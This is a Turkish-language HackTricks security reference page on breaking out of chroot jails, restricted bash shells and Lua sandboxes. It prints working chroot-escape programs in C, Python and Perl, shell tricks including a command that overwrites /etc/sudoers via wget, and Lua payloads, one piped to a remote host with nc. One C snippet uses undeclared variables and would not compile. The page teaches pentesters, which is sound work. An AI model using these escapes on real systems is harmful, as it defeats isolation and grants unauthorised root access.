# Hapishaneden Kaçış

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## **GTFOBins**

**"Shell" özelliğine sahip herhangi bir ikili dosyayı çalıştırabilir misiniz diye** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **adresinde arama yapın**

## Chroot Kaçışları

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) **sitesinden**: Chroot mekanizması, **açık** (**root**) **kullanıcılar** tarafından **kasıtlı müdahalelere karşı korunmak için tasarlanmamıştır**. Çoğu sistemde, chroot bağlamları düzgün bir şekilde yığılmaz ve yeterli ayrıcalıklara sahip chrooted programlar **kırılmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, kaçmak için chroot içinde kök olmanız gerektiği anlamına gelir.

{% hint style="success" %}
**Araç** [**chw00t**](https://github.com/earthquake/chw00t) aşağıdaki senaryoları kötüye kullanmak ve `chroot`tan kaçmak için oluşturulmuştur.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Eğer bir chroot içinde **kök** iseniz, **başka bir chroot oluşturarak kaçabilirsiniz**. Bu, 2 chroot'un aynı anda var olamayacağı (Linux'ta) için geçerlidir, bu yüzden yeni bir klasör oluşturursanız ve ardından **dışında olacak şekilde** bu yeni klasörde **yeni bir chroot oluşturursanız**, artık **yeni chroot'un dışında olacaksınız** ve dolayısıyla FS içinde olacaksınız.

Bu genellikle chroot'un çalışma dizinini belirtilene taşımaz, bu yüzden bir chroot oluşturabilirsiniz ancak dışında olabilirsiniz.
{% endhint %}

Genellikle bir chroot hapishanesi içinde `chroot` ikili dosyasını bulamazsınız, ancak bir ikili dosya derleyebilir, yükleyebilir ve çalıştırabilirsiniz:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Kayıtlı fd

{% hint style="warning" %}
Bu, önceki duruma benzer, ancak bu durumda **saldırgan bir dosya tanımlayıcısını mevcut dizine kaydeder** ve ardından **yeni bir klasörde chroot oluşturur**. Son olarak, chroot dışında **FD'ye erişimi olduğundan**, ona erişir ve **kaçar**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD Unix Domain Sockets üzerinden iletilir, bu yüzden:

* Bir çocuk süreç oluştur (fork)
* Ebeveyn ve çocuğun iletişim kurabileceği UDS oluştur
* Çocuk süreçte farklı bir klasörde chroot çalıştır
* Ebeveyn süreçte, yeni çocuk sürecin chroot'unun dışında olan bir klasörün FD'sini oluştur
* UDS kullanarak o FD'yi çocuk sürece ilet
* Çocuk süreç o FD'ye chdir yapar ve chroot'unun dışında olduğundan hapisten kaçar
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Kök cihazını (/) chroot içinde bir dizine bağlama
* Bu dizine chroot yapma

Bu Linux'ta mümkündür
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Procfs'i chroot içinde bir dizine bağla (henüz bağlı değilse)
* Farklı bir kök/cwd girişi olan bir pid ara, örneğin: /proc/1/root
* Bu girişe chroot yap
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Bir Fork oluştur (çocuk süreç) ve FS içinde daha derin bir klasöre chroot yap ve ona CD yap
* Ebeveyn süreçten, çocuk sürecin bulunduğu klasörü çocukların chroot'unun öncesindeki bir klasöre taşı
* Bu çocuk süreç chroot'un dışında bulacaktır kendisini
{% endhint %}

### ptrace

{% hint style="warning" %}
* Kullanıcılar zamanında kendi süreçlerini kendi süreçlerinden hata ayıklayabilirdi... ancak artık varsayılan olarak bu mümkün değil
* Yine de, mümkünse, bir sürece ptrace yapabilir ve içinde bir shellcode çalıştırabilirsiniz ([bu örneğe bakın](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Hapishaneleri

### Numaralandırma

Hapishane hakkında bilgi al:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH Değiştirme

PATH ortam değişkenini değiştirip değiştiremeyeceğinizi kontrol edin.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim Kullanımı
```bash
:set shell=/bin/sh
:shell
```
### Betik oluştur

_/bin/bash_ içeriğine sahip yürütülebilir bir dosya oluşturabilir misiniz kontrol edin
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH üzerinden bash alın

Eğer ssh üzerinden erişiyorsanız, bir bash kabuğunu yürütmek için bu hileyi kullanabilirsiniz:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Tanımla
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Örneğin sudoers dosyasını üzerine yazabilirsiniz
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Diğer hileler

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Ayrıca ilginç olabilecek sayfa:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Hapishaneleri

Python hapishanelerinden kaçma hakkında hileler aşağıdaki sayfada bulunabilir:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Hapishaneleri

Bu sayfada lua içinde erişebileceğiniz global fonksiyonları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Komut yürütme ile değerlendirme:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir kütüphanenin fonksiyonlarını **noktalar kullanmadan çağırmak** için bazı hileler:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
### Kütüphanenin fonksiyonlarını sıralama:
```bash
for k,v in pairs(string) do print(k,v) end
```
Not alın ki her seferinde önceki tek satırlık komutu **farklı bir lua ortamında çalıştırdığınızda fonksiyonların sırası değişir**. Dolayısıyla belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua ortamlarını yükleyerek ve le kütüphanesinin ilk fonksiyonunu çağırarak kaba kuvvet saldırısı gerçekleştirebilirsiniz:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua kabuğu alın**: Eğer sınırlı bir lua kabuğunun içindeyseniz, aşağıdaki komutu kullanarak yeni bir lua kabuğu alabilirsiniz (ve umarım sınırsızdır):
```bash
debug.debug()
```
## Referanslar

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slaytlar: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
AWS Hacking'ini öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'ini öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking püf noktalarını paylaşarak PR'ler göndererek **HackTricks** ve **HackTricks Cloud** github depolarına katkıda bulunun.

</details>
{% endhint %}
